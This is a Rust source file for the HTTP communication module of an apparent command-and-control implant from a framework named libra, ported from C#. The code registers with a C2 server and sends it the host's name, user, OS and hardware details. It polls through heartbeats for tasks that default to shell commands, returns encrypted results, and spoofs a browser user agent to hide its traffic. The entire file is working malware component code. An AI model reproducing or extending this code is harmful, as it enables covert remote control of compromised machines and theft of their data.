//! HTTP communicator — registration, heartbeat polling, result submission.
//! Port of HttpCommunicator.cs.
//!
//! Heartbeat and result payloads are AES-256-GCM encrypted with the session
//! key negotiated at registration (RSA-OAEP protected), using the canonical
//! `nonce || tag || ciphertext` layout shared with the C# CryptoHelper.

use libra_common::models::AgentTask;
use reqwest::Client;

const AES_KEY_SIZE: usize = 32;

/// HTTP communicator for beacon-style communication with the C2 server.
pub struct HttpCommunicator {
    client: Client,
    server_url: String,
    register_path: String,
    heartbeat_path: String,
    result_path: String,
}

impl HttpCommunicator {
    pub fn new(
        server_url: &str,
        register_path: &str,
        heartbeat_path: &str,
        result_path: &str,
    ) -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .unwrap_or_else(|e| {
                eprintln!("[http] Failed to create HTTP client with custom UA, using default: {}", e);
                Client::new()
            });

        Self {
            client,
            server_url: server_url.to_string(),
            register_path: register_path.to_string(),
            heartbeat_path: heartbeat_path.to_string(),
            result_path: result_path.to_string(),
        }
    }

    fn register_url(&self) -> String {
        format!("{}{}", self.server_url, self.register_path)
    }

    fn heartbeat_url(&self) -> String {
        format!("{}{}", self.server_url, self.heartbeat_path)
    }

    fn result_url(&self) -> String {
        format!("{}{}", self.server_url, self.result_path)
    }

    /// Register with the C2 server.
    /// Returns the assigned agent_id and (if present) the RSA-encrypted
    /// AES session key as raw bytes.
    pub async fn register(
        &self,
        hostname: &str,
        user_name: &str,
        os_version: &str,
        arch: &str,
        public_key: &str,
        hardware_json: &str,
    ) -> Result<(String, Option<Vec<u8>>), String> {
        let pid = std::process::id();
        let hw = if hardware_json.is_empty() || hardware_json == "null" {
            "null"
        } else {
            hardware_json
        };

        let json = format!(
            r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","hardware":{}}}"#,
            escape(hostname),
            escape(user_name),
            escape(os_version),
            escape(arch),
            pid,
            escape(public_key),
            hw
        );

        let resp = self
            .client
            .post(self.register_url())
            .header("Content-Type", "application/json")
            .body(json)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Registration failed with status: {}", resp.status()));
        }

        let body = resp.text().await.map_err(|e| e.to_string())?;
        let agent_id = extract_string(&body, "agent_id")
            .ok_or_else(|| "agent_id not found in response".to_string())?;

        let session_key = extract_optional_b64(&body, "session_key");

        Ok((agent_id, session_key))
    }

    /// Send a heartbeat and receive a pending task (if any).
    /// When `session_key` is provided the request/response are AES-GCM encrypted.
    pub async fn heartbeat(
        &self,
        agent_id: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<Option<AgentTask>, String> {
        let body = match session_key {
            Some(key) => format!(
                r#"{{"payload":"{}"}}"#,
                libra_crypto::encrypt_payload("{}", key)
            ),
            None => "{}".to_string(),
        };

        let resp = self
            .client
            .post(self.heartbeat_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body(body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !resp.status().is_success() {
            return Err(format!("Heartbeat failed: {}", resp.status()));
        }

        let resp_body = resp.text().await.map_err(|e| e.to_string())?;

        let json = match session_key {
            Some(key) => {
                let v: serde_json::Value = serde_json::from_str(&resp_body)
                    .map_err(|e| format!("Failed to parse heartbeat response: {}", e))?;
                let payload = v
                    .get("payload")
                    .and_then(|p| p.as_str())
                    .ok_or("missing payload in heartbeat response")?;
                libra_crypto::decrypt_payload(payload, key)?
            }
            None => resp_body,
        };

        let v: serde_json::Value = serde_json::from_str(&json)
            .map_err(|e| format!("Failed to parse heartbeat response: {}", e))?;

        match v.get("pendingTask") {
            Some(task_val) if !task_val.is_null() => {
                let task_json = serde_json::to_string(task_val)
                    .map_err(|e| format!("Failed to serialize pendingTask: {}", e))?;
                Ok(Some(parse_task(&task_json)))
            }
            _ => Ok(None),
        }
    }

    /// Submit task result back to the C2 server.
    /// When `session_key` is provided the result is AES-GCM encrypted.
    pub async fn submit_result(
        &self,
        agent_id: &str,
        result_json: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<(), String> {
        let body = match session_key {
            Some(key) => format!(
                r#"{{"payload":"{}"}}"#,
                libra_crypto::encrypt_payload(result_json, key)
            ),
            None => result_json.to_string(),
        };

        self.client
            .post(self.result_url())
            .header("X-Agent-Id", agent_id)
            .header("Content-Type", "application/json")
            .body(body)
            .send()
            .await
            .map_err(|e| e.to_string())?;
        Ok(())
    }
}

// ── JSON extraction helpers ──────────────────────────────────────────

fn escape(s: &str) -> String {
    libra_common::json_util::escape_json(s)
}

fn extract_string(json: &str, key: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    v.get(key)?.as_str().map(|s| s.to_string())
}

fn extract_optional_b64(json: &str, key: &str) -> Option<Vec<u8>> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    let s = v.get(key)?.as_str()?;
    if s.is_empty() {
        return None;
    }
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD.decode(s).ok()
}

fn parse_task(json: &str) -> AgentTask {
    match serde_json::from_str::<AgentTask>(json) {
        Ok(task) => task,
        Err(_) => {
            // Fallback: parse from Value for partial compatibility
            let v: serde_json::Value = serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
            use libra_common::models::{CommandType, TaskStatus};
            AgentTask {
                id: v["id"].as_str().unwrap_or_default().to_string(),
                agent_id: v["agentId"].as_str().unwrap_or_default().to_string(),
                created_by: v["createdBy"].as_str().unwrap_or_default().to_string(),
                command: v["command"].as_str().unwrap_or_default().to_string(),
                command_type: v["commandType"].as_str()
                    .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(CommandType::Shell),
                arguments: Vec::new(),
                status: v["status"].as_str()
                    .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(TaskStatus::Pending),
                output: v["output"].as_str().map(|s| s.to_string()),
                error: v["error"].as_str().map(|s| s.to_string()),
                timeout_seconds: v["timeoutSeconds"].as_i64().unwrap_or(60) as i32,
            }
        }
    }
}
